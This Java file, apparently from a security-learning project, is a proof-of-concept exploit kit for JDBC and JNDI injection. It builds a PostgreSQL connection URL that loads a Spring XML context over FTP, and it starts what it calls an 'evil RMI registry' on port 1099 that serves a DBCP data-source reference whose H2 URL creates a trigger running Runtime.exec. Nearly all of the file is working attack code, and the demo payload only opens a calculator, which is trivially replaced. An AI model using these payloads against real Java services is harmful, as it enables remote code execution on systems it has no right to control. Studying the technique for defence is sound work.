package org.joychou.util;


import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.NamingException;
import javax.naming.Reference;
import javax.naming.StringRefAddr;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.sql.DriverManager;
import java.sql.SQLException;

public class Test {
    public static void postgresqlTest() throws SQLException {
        DriverManager.getConnection("jdbc:postgresql://localhost:5432/testdb?socketFactory=org.springframework.context.support.FileSystemXmlApplicationContext&socketFactoryArg=ftp://127.0.0.1:2121/test.xml");
    }

    private static Reference tomcat_dbcp2_RCE(){
        return dbcpByFactory("org.apache.tomcat.dbcp.dbcp2.BasicDataSourceFactory");
    }
    private static Reference tomcat_dbcp1_RCE(){
        return dbcpByFactory("org.apache.tomcat.dbcp.dbcp.BasicDataSourceFactory");
    }
    private static Reference commons_dbcp2_RCE(){
        return dbcpByFactory("org.apache.commons.dbcp2.BasicDataSourceFactory");
    }
    private static Reference commons_dbcp1_RCE(){
        return dbcpByFactory("org.apache.commons.dbcp.BasicDataSourceFactory");
    }
    private static Reference dbcpByFactory(String factory){
        Reference ref = new Reference("javax.sql.DataSource",factory,null);
        String JDBC_URL = "jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER shell3 BEFORE SELECT ON\n" +
                "INFORMATION_SCHEMA.TABLES AS $$//javascript\n" +
                "java.lang.Runtime.getRuntime().exec('calc')\n" +
                "$$\n";
        ref.add(new StringRefAddr("driverClassName","org.h2.Driver"));
        ref.add(new StringRefAddr("url",JDBC_URL));
        ref.add(new StringRefAddr("username","root"));
        ref.add(new StringRefAddr("password","password"));
        ref.add(new StringRefAddr("initialSize","1"));
        return ref;
    }

    public static void JNDIstart() throws
            AlreadyBoundException, RemoteException, NamingException {
        Registry registry = LocateRegistry.createRegistry(1099);
        Reference reference = commons_dbcp2_RCE();
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
        registry.bind("Exploit",referenceWrapper);
        System.out.println("Creating evil RMI registry on port 1099");
    }


    public static void main(String[] args) throws SQLException, AlreadyBoundException, NamingException, RemoteException {
        JNDIstart();
    }
}
